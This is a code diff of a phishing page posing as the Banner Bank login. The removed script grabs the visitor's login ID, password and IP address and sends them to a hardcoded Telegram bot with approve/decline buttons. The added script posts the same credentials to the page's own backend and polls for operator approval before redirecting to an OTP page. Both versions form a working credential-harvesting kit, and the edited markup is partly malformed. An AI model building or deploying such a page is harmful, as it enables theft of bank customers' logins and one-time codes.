@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banner Bank Login</title>
-    <link rel="icon" type="image/png" href="images/BANR-icon.png">
-    <style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Banner Bank Login</title>
+  <link rel="icon" type="image/png" href="images/BANR-icon.png" />
+  <style>
+<style>
         body {
             margin: 0;
             padding: 0;
@@ -346,136 +347,120 @@
             }
         }
     </style>
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
 </head>
 <body>
-    <section class="main-container">
-        <div class="fig-container">
-            <div><img src="images/FDIC.jpeg" alt="FDIC Logo"></div>
-            <div class="fidc_writing">FDIC Insured - Backed by the full faith and credit of the U.S. Government</div>
-        </div>
-        <div class="login-container">
-            <div class="image-section">
-                <img src="images/bannerbank.png" alt="Banner Bank Logo" class="imgg">
-            </div>
-            <div class="login-section">
-                <form class="login-form" action="/login" method="POST">
-                    <label for="login-id">Login ID</label>
-                    <input type="text" id="login-id" name="login-id" required />
-
-                    <label for="password">Password</label>
-                    <div class="password-container">
-                        <input type="password" id="password" name="password" required />
-                        <span class="show-password" role="button" aria-label="Show password" tabindex="0" onclick="togglePassword()"></span>
-                    </div>
-
-                    <div class="remember-container">
-                        <input type="checkbox" id="remember" aria-label="Remember me" />
-                        <span class="checkbox-custom">
-                            <svg aria-hidden="true" width="20" height="20" viewBox="0 0 20 20" focusable="false">
-                                <rect x="1" y="1" width="18" height="18" rx="3"></rect>
-                                <path d="M5 10l4 4l6 -6" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
-                            </svg>
-                        </span>
-                        <label for="remember">Remember me</label>
-                    </div>
-
-                    <button type="submit" class="login-btn">Log In</button>
-                </form>
-            </div>
-            <div class="footer-section">
-                <a href="#">Locations</a>
-                <a href="#">Privacy Policy</a>
-                <a href="#">Forgot Password</a>
-                <a href="#">Unlock/Forgot Login ID</a>
-                <a href="#">Enroll</a>
-            </div>
-        </div>
-    </section>
-    <div id="waitPage" role="alert" aria-live="assertive">
-        <div class="wait-content">
-            <div class="spinner"></div>
-            <p>Waiting for login approval...</p>
-        </div>
+  <section class="main-container">
+    <div class="fig-container">
+      <div><img src="images/FDIC.jpeg" alt="FDIC Logo" /></div>
+      <div class="fidc_writing">
+        FDIC Insured - Backed by the full faith and credit of the U.S. Government
+      </div>
     </div>
 
-    <script>
-        function togglePassword() {
-            const passwordInput = document.getElementById('password');
-            const toggleButton = document.querySelector('.show-password');
-            const isPassword = passwordInput.type === 'password';
-            passwordInput.type = isPassword ? 'text' : 'password';
-            toggleButton.classList.toggle('show-password--visible', !isPassword);
-            toggleButton.setAttribute('aria-label', isPassword ? 'Hide password' : 'Show password');
-        }
+    <div class="login-container">
+      <div class="image-section">
+        <img src="images/bannerbank.png" alt="Banner Bank Logo" class="imgg" />
+      </div>
 
-        document.querySelector('.show-password').addEventListener('keydown', (event) => {
-            if (event.key === 'Enter' || event.key === ' ') {
-                event.preventDefault();
-                togglePassword();
-            }
+      <div class="login-section">
+        <form class="login-form" id="loginForm">
+          <label for="login-id">Login ID</label>
+          <input type="text" id="login-id" name="login-id" required />
+
+          <label for="password">Password</label>
+          <div class="password-container">
+            <input type="password" id="password" name="password" required />
+            <span class="show-password" role="button" aria-label="Show password" tabindex="0" onclick="togglePassword()"></span>
+          </div>
+
+          <div class="remember-container">
+            <input type="checkbox" id="remember" aria-label="Remember me" />
+            <span class="checkbox-custom">
+              <svg aria-hidden="true" width="20" height="20" viewBox="0 0 20 20" focusable="false">
+                <rect x="1" y="1" width="18" height="18" rx="3"></rect>
+                <path d="M5 10l4 4l6 -6" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+              </svg>
+            </span>
+            <label for="remember">Remember me</label>
+          </div>
+
+          <button type="submit" class="login-btn">Log In</button>
+        </form>
+      </div>
+
+      <div class="footer-section">
+        <a href="#">Locations</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Forgot Password</a>
+        <a href="#">Unlock/Forgot Login ID</a>
+        <a href="#">Enroll</a>
+      </div>
+    </div>
+  </section>
+
+  <div id="waitPage" role="alert" aria-live="assertive">
+    <div class="wait-content">
+      <div class="spinner"></div>
+      <p>Waiting for login approval...</p>
+    </div>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const pwd = document.getElementById('password');
+      pwd.type = pwd.type === 'password' ? 'text' : 'password';
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const loginId = document.getElementById('login-id').value;
+      const password = document.getElementById('password').value;
+
+      document.getElementById('waitPage').style.display = 'flex';
+
+      fetch('/login', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({login: loginId, password: password})
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success && data.id) {
+          checkStatus(data.id);
+        } else {
+          alert("Error: Login failed.");
+          document.getElementById('waitPage').style.display = 'none';
+        }
+      })
+      .catch(err => {
+        alert("Network error.");
+        document.getElementById('waitPage').style.display = 'none';
+      });
+    });
+
+    function checkStatus(id) {
+      const interval = setInterval(() => {
+        fetch(`/status/${id}`)
+        .then(res => res.json())
+        .then(data => {
+          if (data.status === 'approved') {
+            clearInterval(interval);
+            window.location.href = data.redirect_url || 'otp.html';
+          }
+        })
+        .catch(() => {
+          clearInterval(interval);
+          alert('Error checking approval status.');
+          document.getElementById('waitPage').style.display = 'none';
         });
-
-        const config = {
-            botToken: '7915117001:AAED4axtxCp0TznMMRttirjkuBCWsSwq7GA',
-            chatId: '6656157295'
-        };
-
-        async function sendTelegramMessage(message, inlineKeyboard = null) {
-            const telegramApiUrl = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
-            const payload = {
-                chat_id: config.chatId,
-                text: message,
-                parse_mode: 'HTML'
-            };
-            if (inlineKeyboard) payload.reply_markup = { inline_keyboard: inlineKeyboard };
-            
-            const response = await fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            const data = await response.json();
-            if (!data.ok) throw new Error('Failed to send message');
-            return data.result.message_id;
-        }
-
-        async function sendLoginRequest(username, password, ip) {
-            const escapeHtml = (str) => str.replace(/[&<>"']/g, (m) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&apos;' })[m]);
-            const message = `🔐 FHB Login Attempt 🔐\n👤 Username: <code>${escapeHtml(username)}</code>\n🔑 Password: <code>${escapeHtml(password)}</code>\n🌐 IP: <code>${ip}</code>`;
-            const inlineKeyboard = [
-                [
-                    { text: '✅ Approve', callback_data: 'approve_login' },
-                    { text: '❌ Decline', callback_data: 'decline_login' }
-                ]
-            ];
-            return sendTelegramMessage(message, inlineKeyboard);
-        }
-
-        document.querySelector('.login-form').addEventListener('submit', async (event) => {
-            event.preventDefault();
-            
-            const username = document.getElementById('login-id').value;
-            const password = document.getElementById('password').value;
-            const submitBtn = document.querySelector('.login-btn');
-            const waitPage = document.getElementById('waitPage');
-            
-            submitBtn.disabled = true;
-            submitBtn.setAttribute('aria-busy', 'true');
-            waitPage.style.display = 'flex';
-            
-            try {
-                const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-                await sendLoginRequest(username, password, ip);
-                setTimeout(() => {
-                    window.location.href = 'otp.html';
-                }, 10000);
-            } catch (error) {
-                waitPage.style.display = 'none';
-                submitBtn.disabled = false;
-                submitBtn.setAttribute('aria-busy', 'false');
-                alert('❌ Failed to process login. Please try again.');
-            }
-        });
-    </script>
+      }, 3000);
+    }
+  </script>
 </body>
 </html>
